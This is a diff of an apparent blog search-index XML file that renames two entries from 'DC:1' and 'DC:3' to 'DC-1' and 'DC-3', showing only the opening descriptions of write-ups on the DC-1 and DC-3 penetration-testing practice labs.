   <entry>
-    <title>DC:1</title>
+    <title>DC-1</title>
     <url>/2020/08/21/DC-1/</url>
     <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
 <p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
@@ -891,7 +1025,7 @@
       </tags>
   </entry>
   <entry>
-    <title>DC:3</title>
+    <title>DC-3</title>
     <url>/2020/08/22/DC-3/</url>
     <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
 <p>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
